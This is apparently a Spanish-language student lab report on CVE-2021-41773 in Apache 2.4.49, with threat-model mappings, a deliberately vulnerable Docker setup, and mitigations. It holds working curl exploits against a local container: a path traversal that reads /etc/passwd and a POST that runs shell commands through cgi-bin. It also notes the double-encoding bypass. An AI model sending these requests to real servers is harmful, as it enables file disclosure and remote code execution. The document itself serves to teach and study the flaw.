## alfa introducción
### 1. Selección del CVE

### CVE-2021-41773

### Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49

### Resumen ejecutivo
Se identificó una vulnerabilidad en el servidor HTTP de apache 2.4.49, se instalo en un contenedor y se configuro para permitir la explotación (path traversal, RCE).
Se ejecutaron ambas explotaciones en el contenedor, leyendo archivos en el sistema de archivos especificados por medio de una petición GET y ejecutando código arbitrario en bash utilizando el mismo mecanismo.
Se implementaron mitigaciones básicas (configuración de seguridad mínima y inhabilitación de scripts CGI).

## beta. Desarrollo
### 2. Análisis documental

CVE-2021-41773
Software afectado: Apache HTTP Server 2.4.49
Common Weakness Ennumeration:
CWE-78 (especifico para scripts arbitrarios): Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Descripción técnica:
La vulnerabilidad consiste que el servidor Apache al recibir peticiones HTTP, valida el path antes de decodificarlo, lo cual permite a un usuario acceder a partes del sistema de archivos a los cuales normalmente no debería. (En vez de "www.lol.com/../../../etc/whatever", el atacante manda "www.lol.com/.%2e./.%2e./.%2e./etc/whatever". El servidor no detecta el path implícito (BUG CENTRAL) y posteriormente lo decodifica y lo trata como un path legal, permitiendo que el atacante acceda a partes del servidor a las que usualmente no tendría)
Requiere que el servidor tenga una configuración de acceso negligente, pero la esencia de la vulnerabilidad es la normalización incorrecta, no la configuración incorrecta (esta solo es un posible vector de ataque).
Si el servidor se encuentra muy mal configurado, entonces esta vulnerabilidad puede escalar a ejecución remota de código.
El impacto es severo, generando la posibilidad de perdida total de confidencialidad de los datos en el servidor que pertenezcan al demonio de apache (salvo los que se encuentren cifrados)


En que fase del Cyber Kill Chain se encuentra la explotación?

    Reconocimiento -> previa a la explotación (identificación de un servicio con versión obsoleta / vulnerable
    Armamento o armificación (weaponization) - > parte de la explotación, consiste en identificar que la vulnerabilidad en Apache server 2.4.49 implica que podemos crear peticiones GET que aprovechen la falta de normalización para transgredir.
    Entrega -> parte de la explotación, consiste en mandar la petición armificada al servidor
    Explotación -> parte de la explotación, al correr el código sin normalización adecuada, el usuario puede leer archivos fuera del contenedor de Apache, si están activados los scripts en el servidor es posible correr código externo como el daemon de apache.
    Instalación -> posterior a la explotación, el acceso limitado adquirido con los pasos anteriores puede proveer una superficie mas grande para intentar introducir código malicioso
    Control y Comando (C2) -> posterior a la explotación
    Acción sobre los objetivos -> posterior a la explotación


  - ¿A qué categorías de _STRIDE_ corresponde esta amenaza?
  I - Information disclosure -> esta vulnerabilidad permite a un usuario no autenticado acceder a datos que pueden estar fuera de acceso de usuarios normales
  E - Elevation of privilege -> si los scripts están activados, un usuario no autenticado puede acceder a una terminal bash con los privilegios del daemon de Apache
  
- ¿Qué tácticas y técnicas de _MITRE ATT&CK_ estarían involucradas? (Si
    el CVE ya tiene mapeo público en ATT&CK, mejor; si no, busquen técnicas
    que apliquen)
  
Initial access


T1190- Exploit Public facing application
El adversario puede explotar una vulnerabilidad en un servidor en el internet. Esta debilidad se puede deber a un bug, un glitch temporal o un error de configuración.


M1026-Privileged Account Management - Usar el mínimo de privilegio para las cuentas que corren los procesos minimizan la cantidad de información vulnerada.


Discovery


T1083 — File and Directory Discovery - Un adversario puede enumerar la información en el servidor


Mitigaciones - Este tipo de técnica no se puede mitigar fácilmente debido a que se fundamenta en el abuso de funciones del sistema.


Collection


T1005 — Data from Local System - Un adversario puede leer datos del servidor


M1057 - Data Loss Prevention - La prevención de perdida de datos puede restringir el acceso a datos sensibles y detectar los datos sensibles que se encuentran sin cifrar.


T1059 — Command and Scripting Interpreter - Un adversario puede abusar interpretes de scripts para ejecutar comandos arbitrarios.


M1045 	Code Signing - Cuando sea posible, solo permitir la ejecución de scripts firmados.


Exfiltration


T1567 -Exfiltration over web-service - Un adversario puede utilizar un servicio legitimo para exfiltrar datos, evadiendo los canales legítimos.

Impact


T1491-defacement - Un adversario puede alterar el contenido de un servidor.


M1053 	Data Backup - Tener respaldos es una forma de reparar una catástrofe en el caso de tener problemas de seguridad.

### 3. Configuración del entorno de pruebas

La configuración de este entorno de pruebas es relativamente sencillo con docker:

### 3.1 attack config
```
### hacer contenedor de docker con la imagen vulnerable del servidor http apache 2.4.49
sudo docker run -d -p 8080:80 --name apache-vuln httpd:2.4.49
## entrar
sudo docker exec -it apache-vuln bash
```

```
### configurar vulnerabilidad (deshabilitar controles de acceso)
sed -i 's/Require all denied/Require all granted/' conf/httpd.conf
### habilitar modulo cgid
sed -i 's/#LoadModule cgid_module/LoadModule cgid_module/' conf/httpd.conf
```

```
### desactivar
#sed -i 's/Require all granted/Require all denied/' conf/httpd.conf
#sed -i 's/LoadModule cgid_module/#LoadModule cgid_module/' conf/httpd.conf
```

```
### reiniciar servidor
httpd -k restart
sleep 5
httpd -k restart
```
<img width="873" height="383" alt="serverSideSadness" src="https://github.com/user-attachments/assets/cd1f4125-255f-4b28-bd4b-b77c62a47761" />



### 4. Explotación controlada
El ataque es muy sencillo, una vez identificado un servidor mal configurado y vulnerable solo tenemos que mandar una petición GET que utilice el código .%2e en vez de '.' para evitar que la normalización de strings de apache lo detecte como un path en el sistema, permitiendo escribir expresiones como ../../../../etc/passwd en el url sin que el servidor lo maneje adecuadamente.

`curl http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`

<img width="458" height="563" alt="traversal" src="https://github.com/user-attachments/assets/74989481-0b46-4853-abd8-aef67575744f" />



<img width="463" height="92" alt="traversal2" src="https://github.com/user-attachments/assets/49dc5314-f059-4312-893e-b168b9c9623d" />


Si el servidor permite la ejecución de scripts, es posible enviar un payload con código arbitrario al shell del servidor
`curl -s --data "echo; echo; echo 'buddy u dun fucked up';" "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"`

<img width="454" height="129" alt="clientSideCracked" src="https://github.com/user-attachments/assets/522c2367-ab04-4270-b38d-9e7290efedef" />


<img width="700" height="316" alt="clientSideCracking" src="https://github.com/user-attachments/assets/f0c2ed88-91b6-48c9-a215-8239a80a2e37" />


Cerramos el contenedor (superficie de ataque)

`sudo docker stop apache-vuln`

## gamma. Análisis de mitigaciones.
Este ataque puede tener éxito porque el saneamiento de entradas de Apache fallo en esta versión. Una forma de prevenir esto seria tener un saneamiento de entradas redundante (como un Web Application Firewall (WAF) bien configurado que detectaría el url malicioso y lo bloquearía antes de que llegara al servidor Apache).
Se intento parchar esta vulnerabilidad bloqueando la cadena ".%2e" pero los desarrolladores no previeron que el atacante podía usar doble codificación "%%32%65" para evitar el parche, teniendo como consecuencia el CVE-2021-42013, que finalmente se arregló reescribiendo ap_normalize_path para verificar todo el URL antes de validarlo.
Otra forma de prevenirlo es tener un control de acceso bien configurado (principio de menor privilegio).
Un mecanismo que evita que este ataque llegue a la ejecución de código arbitrario es limitar el uso de scripts en un servidor, ya sea por completo o solo permitir la ejecución de scripts firmados.

<img width="881" height="51" alt="serverSideFix1" src="https://github.com/user-attachments/assets/7e15cbb9-9f1b-4c74-b263-b7392fcb9c40" />


<img width="470" height="98" alt="foiled1" src="https://github.com/user-attachments/assets/76e4e9b0-24a8-4a4f-9228-ae1a472b0628" />


### eta. Reflexión personal
Este ejercicio me dejó mucho mas claro como se desarrolla el Cyber Kill Chain, ya que me toco ejecutar varios de los pasos de la cadena (armificacion, entrega, explotación). Me quedo claro que aun habiendo documentación de una vulnerabilidad, la dificultad de ejecutar un exploit puede variar abismalmente, desde tener que ser preciso a nivel byte, hasta mandar un carácter particular.
Me dejó claro que una configuración adecuada en un sistema puede evitar que un pequeño problema se salga de control.
Una diferencia notoria para mi sobre leer de un ataque y ejecutarlo es que uno puede ponerse creativo y divertirse durante la ejecución, a diferencia de ver un demo estático.
Interactuar con el entorno en tiempo real me permitió observar como diferentes configuraciones significaban que el ataque podía o no proceder como se planeaba.
